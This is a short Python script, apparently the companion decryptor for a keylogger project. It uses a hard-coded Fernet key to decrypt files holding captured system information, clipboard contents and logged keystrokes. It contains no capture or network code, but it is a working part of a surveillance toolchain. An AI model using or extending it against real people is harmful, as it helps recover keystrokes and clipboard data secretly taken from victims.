from cryptography.fernet import Fernet

key="8uZWqnn-nSfzKGKMCU-ZGfdKOlX7jm3346GAcd-rihI="
system_information="e_system_information.txt"
clipboard_information="e_clipboard.txt"
keys_information="e_key_log.txt"

encrypted_files=[system_information,clipboard_information,keys_information]
count=0

for decrypting_files in encrypted_files:
    with open(encrypted_files[count],'rb') as f:
        data=f.read()

    fernet=Fernet(key)
    decrypted=fernet.decrypt(data)

    with open(encrypted_files[count],"wb") as f:
        f.write(decrypted)
    count+=1